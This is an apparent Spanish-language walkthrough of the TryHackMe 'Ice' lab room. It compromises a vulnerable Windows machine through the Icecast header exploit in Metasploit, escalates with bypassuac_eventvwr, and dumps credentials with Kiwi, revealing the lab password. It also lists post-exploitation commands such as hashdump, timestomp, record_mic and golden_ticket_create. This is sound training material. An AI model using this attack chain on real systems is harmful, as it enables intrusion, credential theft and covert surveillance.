# ICE

## Task 1: Connect
Conectarse a la VPN y listo.

## Task 2: Recon

### (a) ¿En qué puerto está Microsoft Remote Desktop (MSRDP)?
En primer lugar realizamos un **ping** a la dirección IP que nos dan y luego hacemos **nmap**. Al hacer esto veremos que el puerto de Microsoft Remote Desktop es el **3389**.

![MSRDP](./Imagenes/1.png)

**ANSWER:** 3389

### (b) ¿Qué servicio está levantado en el puerto 8000?
Si bajamos un poco veremos que en el puerto **8000** se está ejecutando el servicio **Icecast**.

![Puerto_8000](./Imagenes/Servicio_Puerto_8000.png)

**ANSWER:** Icecast

### (c) ¿Cuál es el nombre de la máquina?
![Hostname](./Imagenes/Hostname.png)

**ANSWER:** DARK-PC

## Task 3: Gain Access

### (a) ¿Cuál es el SCORE de la vulnerabilidad de IceCast?
Accedemos en primer lugar a https://www.exploit-db.com/, escribimos **icecast** en el buscador y pinchamos en el enlace señalado en la imagen.

![Icecast_ExploitDB](./Imagenes/Icecast_ExploitDB(1).png)

Entonces podremos ver el CVE correspondiente a esa vulnerabilidad: **CVE-2004-1561**

![Icecast_ExploitDB](./Imagenes/Icecast_ExploitDB(2).png)

Ahora vamos a https://www.cvedetails.com/, escribimos ese CVE en el buscador y ya nos saldrá el **SCORE**, que es **6.4** .

![Icecast_SCORE](./Imagenes/Icecast_SCORE.png)

**ANSWER:** 6.4

### (b) ¿Cuál es su número de CVE?
Ya lo sabemos.

![Icecast_ExploitDB](./Imagenes/Icecast_ExploitDB(2).png)

**ANSWER:** CVE-2004-1561

### (c) Iniciar Metasploit con el comando `msfconsole`
![msfconsole](./Imagenes/msfconsole.png)

### (d) ¿Cuál es la ruta completa del exploit de Icecast?
Escribimos **`search icecast`** y ya podremos ver la ruta buscada.

![ruta_icecast_exploit](./Imagenes/ruta_icecast_exploit.png)

**ANSWER:** exploit/windows/http/icecast_header

### (e) Escribimos `use 0` para utilizar el exploit

![use_0](./Imagenes/use_0.png)

### (f) Al escribir `show options`, ¿cuál es el único setting requerido que está en blanco?
Escribimos `show options` y vemos que el único setting en blanco es **RHOSTS**.

![RHOSTS_1](./Imagenes/rhosts_is_empty.png)

Deberemos rellenarlo indicando la **dirección IP que nos ha dado THM**.

![RHOSTS_2](./Imagenes/IP_rhosts.png)

**ANSWER:** rhosts

### (g) Establecer IP para **LHOST** y ejecutar exploit
La IP para **LHOST** la podemos encontrar en el adaptador **tun0** haciendo **ip a** en la terminal (es la **dirección IP de la VPN** vaya)

![LHOSTS_1](./Imagenes/lhost_ip.png)

Establecemos la IP para **LHOST** y ejecutamos el exploit.

![LHOSTS_2](./Imagenes/ip_lhost_y_ejecucion_exploit.png)

**NOTA:** También podemos escribir **`set lhost tun0`** para establecer la IP. 

## Task 4: Escalate

### (a) ¿Cuál es la shell a la que hemos obtenido acceso?
Si miramos al final de la imagen anterior veremos el nombre de la shell en la que estamos: **meterpreter**

![LHOSTS_2](./Imagenes/ip_lhost_y_ejecucion_exploit.png)

**ANSWER**: meterpreter

### (b) ¿Qué usuario está ejecutando el proceso de Icecast?
Escribimos el comando `ps` y miramos el proceso **Icecast2.exe**. Veremos que el usuario asociado es **Dark**.

![icecast_process](./Imagenes/icecast_process(1).png)

![icecast_process](./Imagenes/icecast_process(2).png)

**ANSWER**: DARK

### (c) ¿Cuál es el build de Windows?
Escribimos el comando `sysinfo` y veremos que el **build** es **7601**.

![windows_build](./Imagenes/windows_build.png)

**ANSWER**: 7601

### (d) ¿Cuál es la arquitectura del proceso?
Miramos la imagen anterior y veremos que la arquitectura es **x64**.

![architecture](./Imagenes/architecture.png)

**ANSWER**: x64

### (e) Ejecutar el comando  **`run post/multi/recon/local_exploit_suggester`**

![potential_escalation_exploits_command](./Imagenes/potencial_escalation_exploits_command.png)

### (f) ¿Cuál es la ruta completa del primer exploit que aparece?

![potential_escalation_exploits_command](./Imagenes/ruta_primer_exploit.png)

**ANSWER**: exploit/windows/local/bypassuac_eventvwr

### (g) **Background session** y usar comando **`sessions`** para listar todas nuestras sesiones activas
Escribimos **`ctrl+Z`** para hacer el **background** de la sesión, pulsamos **`y`** y listamos todas nuestras sesiones activas con **`sessions`**.

![background_session](./Imagenes/background_session.png)

![comando_sessions](./Imagenes/comando_sessions.png)


### (h) Seleccionamos el exploit hallado anteriormente (el primero de la lista de exploits anterior)
Escribimos **`use [ruta_del_exploit]`**

![uso_exploit](./Imagenes/utilizar_primer_exploit.png)

### (i) Establecer sesión para el exploit
Podemos confirmar que es necesario hacerlo usando `options`.

![sesion_exploit](./Imagenes/exploit_session(1).png)

Establecemos la sesión 1, que es la que nos salía antes.

![comando_sessions](/Ice/Imagenes/comando_sessions.png)

![sesion_exploit](./Imagenes/establecer_sesion.png)

### (j) Nombre de la opción establecida incorrectamente
Escribimos **`options`** y vemos que la opción establecida incorrectamente es **LHOST**.

![LHOST_incorrecto](./Imagenes/LHOST_incorrecto.png)

**ANSWER**: LHOST

### (k) Establecer LHOST
Escribimos **`set lhost tun0`**

![set_LHOST](./Imagenes/set_lhost.png)

### (l) Ejecutamos el exploit
Escribimos **`run`**

![ejecutar_exploit](./Imagenes/ejecutar_exploit.png)

### (m) Interactúa con la sesión 2 que se ha abierto
Pasando de esto xD.

### (n) Al usar `getprivs`, ¿qué comando de los listados nos permite tomar control de los ficheros?

![getprivs](./Imagenes/ownership_privilege.png)

**ANSWER**: SeTakeOwnershipPrivilege

## Task 5: Looting
### (a) Listar procesos
![ps](./Imagenes/listar_procesos.png)

### (b) ¿Cuál es el nombre del "printer spool service"?
![printer_spool_service](./Imagenes/printer_spool_service.png)

**ANSWER:** spoolsv.exe

### (c) Migrar a ese proceso
Usaremos el comando **`migrate -N spoolsv.exe`**

![spoolsv.exe](./Imagenes/migrar_a_spoolsv.png)

### (d) ¿Cuál es nuestro usuario ahora mismo?
Usaremos el comando **`getuid`**

![getuid](./Imagenes/NTAUTHORITY_SYSTEM.png)

**ANSWER:** NT AUTHORITY\SYSTEM


### (e) Ejecutar Kiwi
![kiwi](./Imagenes/kiwi.png)

### (f) Abrimos el menú de "AYUDA"
![help](./Imagenes/help.png)

### (g) ¿Cuál es la opción que nos permite recuperar todas las credenciales?
Si nos movemos a través del menú encontraremos la opción que buscamos: **creds_all**

![creds_all](./Imagenes/creds_all.png)

**ANSWER:** creds_all

### (h) Ejecuta este comando y averigua la contraseña de Dark

![creds_all](./Imagenes/dark_password.png)

**ANSWER:** Password01! (en THM no he tenido que escribir "!")

## Task 6: Post-Exploitation

### (a) Revisar menú HELP
Listo.

### (b) ¿Qué comando (menú HELP) nos permite volcar todos los hashes de contraseñas almacenados en el sistema?
Si nos movemos a través del menú encontraremos la opción que buscamos: **hashdump**

![hashdump](./Imagenes/hashdump.png)

**ANSWER:** hashdump

### (c) ¿Qué comando (menú HELP) nos permite ver el remote user's desktop en tiempo real?
Si nos movemos a través del menú encontraremos la opción que buscamos: **screenshare**

![screenshare](./Imagenes/screenshare.png)

**ANSWER:** screenshare

### (d) ¿Y si quisiéramos grabar desde un micrófono del sistema?
Si nos movemos a través del menú encontraremos la opción que buscamos: **record_mic**

![record_mic](./Imagenes/record_mic.png)

**ANSWER:** record_mic

### (e) ¿Qué comando (menú HELP) nos permite modificar los timestamps de los archivos en el sistema?
Si nos movemos a través del menú encontraremos la opción que buscamos: **timestomp**

![timestomp](./Imagenes/timestomp.png)

**ANSWER:** timestomp

### (f) ¿Qué comando (menú HELP) nos permite autenticarnos como cualquier usuario (crear un golden_ticket)?
Si nos movemos a través del menú encontraremos la opción que buscamos: **golden_ticket_create**

![golden_ticket_create](./Imagenes/golden_ticket_create.png)

**ANSWER:** golden_ticket_create

### (g) Habilitar la opción para acceder a la máquina de forma remota
Usaremos el comando **`run post/windows/manage/enable_rdp`**

![habilitar_RDP](./Imagenes/habilitar_RDP.png)
















































